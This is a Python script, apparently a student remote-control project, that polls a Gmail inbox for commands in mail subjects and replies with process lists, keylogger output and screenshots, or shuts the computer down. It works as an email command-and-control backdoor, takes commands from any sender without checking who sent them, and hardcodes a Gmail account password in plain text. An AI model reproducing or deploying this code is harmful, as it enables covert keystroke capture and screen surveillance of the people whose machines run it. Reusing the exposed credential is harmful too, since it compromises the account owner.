#-------------------------------------------------------------------------------------------------
#THINGS WILL BE USED

import smtplib
import imaplib
import email
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.header import decode_header
import screenshot
import shutdown
from process_app import *
from keylogger import key_logger

smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
smtp_port = 587  # Port for TLS

username_checker = 'mangmaytinhremotecontrol@gmail.com'
password_checker = 'lmlx vrwx cwym hvqz'
username_receiver = ""
#-------------------------------------------------------------------------------------------------
# CONNECT + LOGIN

imap = imaplib.IMAP4_SSL(host = 'imap.gmail.com', port = 993)
imap.login(username_checker, password_checker)

#-------------------------------------------------------------------------------------------------
# SEND MAIL

def send_email(sender, receiver, subject, body, image_data = None):
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))
    if image_data is not None:
        image = MIMEImage(image_data, name="image.png")
        msg.attach(image)
    text = msg.as_string()
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username_checker, password_checker)
    server.sendmail(sender, receiver, text)
    server.quit()

#-------------------------------------------------------------------------------------------------
# READ MAIL

def CheckAndDo(cmd):
    if (cmd == 'applications'):
        print("Applications")
        send_email(username_checker, username_receiver,
                   "List of applications:", execute_msg(cmd))
    elif (cmd == 'processes'):
        print("Processes")
        send_email(username_checker, username_receiver,
                   "List of processes:", execute_msg(cmd))
    elif ('Start' in cmd):
        send_email(username_checker, username_receiver,
                   "List of processes:", execute_msg(cmd))
    elif (cmd == 'keylogger'):
        print("Key Logger")
        send_email(username_checker, username_receiver,
                   "Keys pressed:", key_logger())
    elif (cmd == 'screenshot'):
        print("Screenshot")
        image_data = screenshot.screen_shot()
        send_email(username_checker, username_receiver,
                   "Screenshot Taken!", "See attachment: ", image_data)
    elif (cmd == 'shutdown'):
        print("Shutdown")
        send_email(username_checker, username_receiver,
                   "Shutting Down PC!", "PC is shutting down...")
        shutdown.shutdown()

cmd = 'start'
while cmd != 'quit':
    imap.select("Inbox")
    res, mailIds = imap.search(None, '(UNSEEN)')  #Find all unseen mails in Inbox to read

    # Read every unseen mail
    for id in mailIds[0].decode().split():
        res, mailData = imap.fetch(id, '(RFC822)')
        message = email.message_from_string(mailData[0][1].decode())

        # Get message from Subject part of the mail
        cmd = message.get("Subject")
        username_receiver = message.get("From")
        CheckAndDo(cmd.lower())

    imap.close()

    time.sleep(0.4)

print("Bye !!!")

#-----------------------------------------------------------------------------------------

imap.logout()
